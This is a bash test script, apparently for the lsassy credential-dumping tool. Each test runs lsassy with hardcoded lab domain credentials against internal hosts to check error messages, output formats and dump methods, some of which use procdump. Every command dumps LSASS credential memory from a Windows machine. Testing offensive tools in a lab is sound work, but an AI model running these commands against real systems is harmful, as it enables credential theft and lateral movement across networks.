#!/bin/bash

echo -n "[TEST] Connexion error : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.254.254.254' 2>&1)
RET=$(echo "$RESULT" | grep -c 'Connexion error')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Authentication error : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_comin_!@192.168.1.123' 2>&1)
RET=$(echo "$RESULT" | grep -c 'Authentication error')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Access denied : "
RESULT=$(lsassy -j 'adsec.local/jlannister:summer4ever!@192.168.1.123' 2>&1)
RET=$(echo "$RESULT" | grep -c 'Access denied')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Error opening share : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --dumppath "E\$/Windows/Temp" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Error opening share')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Error opening file : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --dumppath "C\$/Windws/Temp" 2>&1)
RET=$(echo "$RESULT" | grep -c 'Error opening file')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi


echo -n "[TEST] Method not supported : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 99 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c 'Method not supported')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] No result, might be too slow : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.121' -m 3 2>&1)
RET=$(echo "$RESULT" | grep -c 'Target might be slow')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] lsass is protected : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.121' -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
RET=$(echo "$RESULT" | grep -c 'protected')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] json : "
RESULT=$(lsassy 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --raw -j  2>&1)
RET=$(echo "$RESULT" | grep -c '"ADMIN01\$"')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] raw : "
RESULT=$(lsassy 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --raw  2>&1)
RET=$(echo "$RESULT" | grep -c 'ADSEC\\ADMIN01\$')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 0 : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 0 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 1 : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 1 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 2 : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 3 : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 3 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

echo -n "[TEST] Method 4 : "
RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 4 --timeout 1 2>&1)
RET=$(echo "$RESULT" | grep -c '{')
if [ "$RET" -gt 0 ]
then
  echo -e "\e[32mSuccess\e[39m"
else
  echo -e "\e[31mFailure\e[39m"
  echo -e "--- Log ---\n$RESULT\n-----------"
fi

